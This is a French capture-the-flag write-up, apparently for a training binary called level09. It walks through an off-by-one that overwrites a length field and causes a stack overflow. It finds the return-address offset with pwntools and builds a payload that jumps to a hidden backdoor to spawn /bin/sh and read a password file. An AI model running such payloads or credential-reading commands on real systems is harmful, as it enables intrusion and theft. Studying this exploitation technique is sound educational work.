## 1. Identifier la fonction cachée

La première chose que l'on remarque est la présence d'une fonction `secret_backdoor()` qui n'est jamais appelée par le programme.

```c
int secret_backdoor(void)
{
    char buffer[128];

    fgets(buffer, 128, stdin);
    return system(buffer);
}
```

Cette fonction lit une ligne sur l'entrée standard puis l'exécute avec `system()`. L'objectif est donc de détourner le flot d'exécution afin de faire retourner le programme vers cette fonction.

On récupère d'abord son adresse :

```gdb
(gdb) p secret_backdoor
0x55555555488c <secret_backdoor>
```

## 2. Analyser la vulnérabilité

La structure utilisée par le programme est la suivante :

```c
struct struct_0
{
    char msg[140];
    char username[40];
    unsigned int len;
};
```

Dans `set_msg()`, le message est copié avec :

```c
strncpy(msg->msg, buffer, msg->len);
```

La taille de la copie dépend donc entièrement de la variable `len`.

Cette variable est initialisée à 140 dans `handle_msg()`.

Le problème provient de la fonction `set_username()` :

```c
for (j = 0; j <= 40; j++)
{
    if (!v0[j])
        printf(">: Welcome, %s", a0 + 140);
        return;
    msg->username[j] = v0[j];
}
```

Le tableau `username` possède une taille de **40 octets** (indices 0 à 39), mais la boucle copie jusqu'à `i == 40`. Il s'agit donc d'un **off-by-one** qui permet d'écrire un octet juste après `username`, c'est-à-dire sur le premier octet de `len`.

En envoyant :

```text
"A"*40 + "\xff"
```

on remplace la valeur de `len` par `0xff` (255).

Ainsi, lors de l'appel suivant à `set_msg()` :

```c
strncpy(msg->msg, buffer, msg->len);
```

`strncpy()` copie **255 octets** dans un buffer prévu pour **140 octets**, ce qui provoque un buffer overflow sur la pile.

## 3. Recherche de l'offset

On génère un motif unique avec pwntools :

```bash
python -c "from pwn import *; print(cyclic(300).decode())"
```

Puis on exécute le programme avec ce motif :

```bash
run < <(python -c "from pwn import *; print 'A'*40 + '\xff' + '\n' + cyclic(300).decode()")
```

Après le crash :

```gdb
(gdb) info registers
...
rbp            0x6261617962616178
...
```

Le registre `RBP` contient une partie du motif. On récupère les 4 octets de poids faible et on recherche leur position dans le pattern :

```bash
python -c "from pwn import *; print(cyclic_find(0x62616178))"
```

On obtient :

```text
192
```

Cela signifie que le **saved RBP** se trouve à l'offset **192**.

Comme le programme est en 64 bits, le **saved RBP** occupe 8 octets. L'adresse de retour (qui sera chargée dans `RIP` lors de l'instruction `ret`) se trouve donc à :

```text
192 + 8 = 200
```

L'offset permettant d'écraser l'adresse de retour est donc **200**.

## 4. Construire le payload

Le payload est composé de :

- 40 octets pour remplir `username`
- `0xff` pour modifier `len`
- un retour à la ligne afin de terminer le premier `fgets()`
- 200 octets de remplissage
- l'adresse de `secret_backdoor()` en little-endian
- un retour à la ligne afin de terminer le second `fgets()`
- `/bin/sh`, qui sera lu par le `fgets()` de `secret_backdoor()`

Le payload est généré avec :

```bash
python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh\n'" > /tmp/exploit
```

On l'exécute ensuite :

```bash
(cat /tmp/exploit; cat) | ./level09
```

Lorsque `handle_msg()` se termine, l'instruction `ret` charge l'adresse de `secret_backdoor()` à la place de l'adresse de retour d'origine. `secret_backdoor()` exécute alors :

```c
system("/bin/sh");
```

On obtient ainsi un shell avec les privilèges du programme et il ne reste plus qu'à récupérer le mot de passe :

```bash
cat /home/users/end/.pass
```